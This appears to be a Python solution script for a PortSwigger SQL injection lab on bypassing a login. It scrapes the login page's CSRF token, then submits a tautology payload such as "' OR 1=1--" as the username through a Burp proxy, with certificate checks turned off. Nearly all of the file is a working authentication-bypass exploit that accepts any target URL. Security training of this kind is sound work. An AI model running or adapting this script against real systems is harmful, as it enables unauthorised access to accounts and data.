import requests
import sys
import urllib3
from bs4 import BeautifulSoup

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Lab link: https://portswigger.net/web-security/sql-injection/lab-login-bypass
# Example malicious payload: "anything_here' OR 1=1--'"
# Note: If you're getting an "check_hostname requires server_hostname"
# exception try reverting your urllib3 version using
# "pip3 install urllib3==1.25.8"


# To redirect traffic to Burp Suite
proxies = {'http': 'http://127.0.0.1:8080', 'https': 'https://127.0.0.1:8080'}


def get_csrf_token(s, url):
    # Perform the get request to the /login page
    # Send requests and responses through the proxy for debugging in Burp
    r = s.get(url, verify=False, proxies=proxies)

    # Parse the csrf token from the HTML response using BeautifulSoup
    soup = BeautifulSoup(r.content, 'html.parser')

    # The csrf token is located in the first input element
    # within the value field
    # print(soup)
    csrf = soup.find('input', {'name': 'csrf'})['value']
    print("\nCSRF Token: %s" % csrf)
    return csrf


def exploit_sqli(s, url, payload):
    csrf = get_csrf_token(s, url)
    data = {"csrf": csrf,
            "username": payload,
            "password": "anything:)"}
    r = s.post(url, data=data, verify=False, proxies=proxies)

    # Used to determine if a login was successful
    res = r.text
    if "Log out" in res:
        return True
    else:
        return False


if __name__ == "__main__":
    try:
        url = sys.argv[1].strip()
        sqli_payload = sys.argv[2].strip()
        print("\nPayload received: [%s]" % sqli_payload)
    except IndexError:
        print('[-] Usage %s <url> <sql-payloads>' % sys.argv[0])
        print('[-] Example: %s www.example.com "1=1"' % sys.argv[0])
        exit(1)

    # Needed to allow parameter persistence across the session
    s = requests.Session()

    if exploit_sqli(s, url, sqli_payload):
        print('[+] SQL injection successful! \
        Now logged in as the administrator user.')

    else:
        print('[-] SQL injection unsuccessful.')
